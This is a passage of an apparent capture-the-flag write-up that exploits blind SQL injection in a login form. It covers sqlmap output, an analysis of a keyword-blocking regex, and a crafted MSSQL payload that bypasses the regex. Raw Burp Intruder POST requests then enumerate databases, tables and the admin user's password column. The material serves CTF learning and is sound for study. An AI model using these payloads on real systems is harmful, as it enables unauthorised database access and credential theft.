+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="nb">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="k">HAVING</span><span class="w"> </span><span class="n">clause</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="s1">&#39; AND 6339=6339 AND &#39;</span><span class="n">IvSQ</span><span class="s1">&#39;=&#39;</span><span class="n">IvSQ</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="k">admin</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1">---</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">[...]</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">WARNING</span><span class="p">]</span><span class="w"> </span><span class="n">reflective</span><span class="w"> </span><span class="n">value</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">filtering</span><span class="w"> </span><span class="k">out</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">operating</span><span class="w"> </span><span class="k">system</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">22</span><span class="p">.</span><span class="mi">04</span><span class="w"> </span><span class="p">(</span><span class="n">jammy</span><span class="p">)</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="n">technology</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">52</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2022</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">[...]</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">hostname</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">retrieved</span><span class="p">:</span><span class="w"> </span><span class="n">ctn</span><span class="o">-</span><span class="n">mbergeron</span><span class="o">-</span><span class="n">photographic</span><span class="o">-</span><span class="n">memory</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="n">hostname</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;ctn-mbergeron-photographic-memory&#39;</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">DBA</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="k">current</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">DBA</span><span class="p">:</span><span class="w"> </span><span class="k">False</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">[...]</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">CRITICAL</span><span class="p">]</span><span class="w"> </span><span class="n">unable</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">retrieve</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nb">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">users</span>
+</code></pre></div>
+<p>The tool was able to find some details but nothing regarding the databases, the tables or the stored data.</p>
+<h3 id="bypass-regex">Bypass regex</h3>
+<p>Let's dig inside this regex to understand how to bypass it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">(</span><span class="k">alter</span><span class="o">|</span><span class="k">create</span><span class="o">|</span><span class="k">delete</span><span class="o">|</span><span class="k">drop</span><span class="o">|</span><span class="k">exec</span><span class="o">|</span><span class="k">execute</span><span class="o">|</span><span class="k">insert</span><span class="o">|</span><span class="n">merge</span><span class="o">|</span><span class="k">select</span><span class="o">|</span><span class="k">update</span><span class="o">|</span><span class="k">union</span><span class="o">|</span><span class="k">truncate</span><span class="p">)([</span><span class="o">^</span><span class="n">a</span><span class="o">-</span><span class="n">z</span><span class="err">\</span><span class="p">]</span><span class="err">\&#39;</span><span class="o">%</span><span class="p">])</span><span class="o">|</span><span class="c1">--|]]|\/\*|\*\/</span>
+</code></pre></div>
+<ul>
+<li>The first group of regex is looking for the following key words : <code>alter|create|delete|drop|exec|execute|insert|merge|select|update|union|truncate</code></li>
+<li>The second group of regex is looking for character not present in the list <code>a-z</code> - <code>]</code> - <code>'</code> - <code>%</code></li>
+<li>If the payload contains <code>--</code> or <code>]]</code> we get blocked</li>
+<li>If the payload contains <code>*/</code> or <code>/*</code> we are also blocked</li>
+</ul>
+<p>Details using <a href="https://regex101.com/">Regex101</a>:</p>
+<p><img alt="Regex explained on Regex101" src="../res/nsec24/regex101.png" /></p>
+<p>After the analysis of the regex we have been able to find an SQL request that would allow us to bypass the regex limitation while dumping the information regarding databases, the tables and stored data:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;%2name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)=&#39;</span><span class="n">m</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="k">admin</span>
+</code></pre></div>
+<p>To help us building our final payload we used <a href="https://codapi.org/mssql/">codapi</a> which allow us to check if our request was correct at a syntax level.</p>
+<p>Here is some explanation regarding our SQL request:</p>
+<ul>
+<li><code>SELECT'm'</code> : This syntax is authorized by MSSQL and allows us to use the <code>SELECT</code> keyword. This will add an arbitrary <code>m</code> letter to every result.  </li>
+<li>You are free to use another letter obviously</li>
+<li><code>%2</code> : You have to encode the <code>+</code> to avoid errors</li>
+<li><code>SUBSTRING((CAST((SELECT'm'%2name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='m'</code> : This part is checking if the first letter of the first database is <code>m</code></li>
+<li><code>AND 'uNDi'='uNDi</code> : This is part of the initial SQL injection identified by <code>sqlmap</code></li>
+</ul>
+<p>To confirm that this request is working we did the following <code>POST</code> requests:</p>
+<p>On this case we tested if the first letter was <code>m</code>, which is always true since we add an arbitrary <code>m</code> at the beginning:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;+name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)=&#39;</span><span class="n">m</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="k">admin</span>
+</code></pre></div>
+<p>We got the following answer, letting us that the username (<code>admin</code>) is the good one, confirming that our request worked:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;alert&quot;</span><span class="p">&gt;</span>Invalid credentials.<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-input&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Here, we tested if the first letter was <code>a</code>, which is false:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;+name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)=&#39;</span><span class="n">a</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="k">admin</span>
+</code></pre></div>
+<p>We got the following answer, letting us now that the username (<code>admin</code>) is not the good one, confirming that our request worked:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;alert&quot;</span><span class="p">&gt;</span>Invalid username.<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-input&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="lets-automate">Let's automate</h3>
+<p>Now that we are able to request the first letter of the database bypassing the regex, we choose to automate the process using the <code>Burp Intruder</code>.</p>
+<h4 id="databases">Databases</h4>
+<p>The first step is to find the name of the databases. At this point, we had to iterate through two points, the index letter we are trying to find, represented by <code>§1§</code>, and the letter we are testing, represented by <code>§m§</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">POST</span> <span class="p">/</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">109</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">115</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xhtml</span><span class="p">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">9</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">webp</span><span class="p">,*/*;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">8</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">x-www-form-urlencoded</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">191</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span><span class="p">/</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="p">=</span><span class="n">k2ip0nk80scvaubpv8u7a54bjg</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="n">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="n">1</span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="n">username</span><span class="p">=</span><span class="n">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;%2bname FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),§1§,1)=&#39;</span><span class="err">§</span><span class="n">m</span><span class="err">§</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="p">&amp;</span><span class="n">passwd</span><span class="p">=</span><span class="n">admin</span>
+</code></pre></div>
+<p>For OFFSET at <code>0</code> we got the following results:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">|</span> <span class="n">0</span>   <span class="p">|</span>   <span class="p">|</span>   <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">|-----|---|---|-----|-------|-------|------|---|--|</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="p">|</span> <span class="n">601</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span> <span class="n">m</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="p">|</span> <span class="n">602</span> <span class="p">|</span> <span class="n">2</span> <span class="p">|</span> <span class="n">m</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="p">|</span> <span class="n">3</span>   <span class="p">|</span> <span class="n">3</span> <span class="p">|</span> <span class="n">a</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="p">|</span> <span class="n">904</span> <span class="p">|</span> <span class="n">4</span> <span class="p">|</span> <span class="n">s</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="p">|</span> <span class="n">955</span> <span class="p">|</span> <span class="n">5</span> <span class="p">|</span> <span class="n">t</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="p">|</span> <span class="n">206</span> <span class="p">|</span> <span class="n">6</span> <span class="p">|</span> <span class="n">e</span> <span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="p">|</span> <span class="n">857</span> <span class="p">|</span> <span class="n">7</span> <span class="p">|</span> <span class="nb">r </span><span class="p">|</span> <span class="n">200</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">false</span> <span class="p">|</span> <span class="n">1782</span> <span class="p">|</span> <span class="n">1</span> <span class="p">|</span>  <span class="p">|</span>
+</code></pre></div>
+<p>Which gave us the name <code>mmaster</code> where we can remove the first arbitrary <code>m</code> we add. After running four (4) times the intruder, we got the following databases names:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>0 : master
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>1 : model
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>2 : msdb
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>3 : photographic_memory
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>4 : tempdb
+</code></pre></div>
+<blockquote>
+<p><strong>Note</strong> : I just realized that we could also add an iterator <code>§</code> on the <code>OFFSET</code> to run the intruder only once ...</p>
+</blockquote>
+<h4 id="tables">Tables</h4>
+<p>Now that we found the databases, we have to run the same kind of exercise to identify the tables. We choose to iterate on the <code>photographic_memory</code> which is probably the database of the current application.</p>
+<p>To do that we use almost the same request but we iterate on <code>photographic_memory..sysobjects</code> instead of <code>master..sysdatabases</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">POST</span> <span class="p">/</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">109</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">115</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xhtml</span><span class="p">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">9</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">webp</span><span class="p">,*/*;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">8</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">x-www-form-urlencoded</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">211</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span><span class="p">/</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="p">=</span><span class="n">k2ip0nk80scvaubpv8u7a54bjg</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="n">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="n">1</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="n">username</span><span class="p">=</span><span class="n">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;%2bname FROM photographic_memory..sysobjects WHERE xtype = &#39;</span><span class="n">U</span><span class="s1">&#39; ORDER BY name OFFSET 1 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),§1§,1)=&#39;</span><span class="err">§</span><span class="n">m</span><span class="err">§</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="p">&amp;</span><span class="n">passwd</span><span class="p">=</span><span class="n">admin</span>
+</code></pre></div>
+<p>After running two (2) times the intruder we got the following databases names:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>0 : file_logs
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>1 : users
+</code></pre></div>
+<h4 id="data">Data</h4>
+<p>Now that we found the table, we have to get the data. We guessed that there would be a <code>username</code> column:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;%2busername FROM users ORDER BY username OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)=&#39;</span><span class="n">m</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="k">admin</span>
+</code></pre></div>
+<p>Which confirmed that there is only one user named <code>admin</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>0 : admin
+</code></pre></div>
+<p>Then we tried multiple other columns name like <code>password</code> - <code>pwd</code> and finally <code>passwd</code> to find the password of the <code>admin</code> user:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">POST</span> <span class="p">/</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">109</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">115</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xhtml</span><span class="p">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">9</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">webp</span><span class="p">,*/*;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">8</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
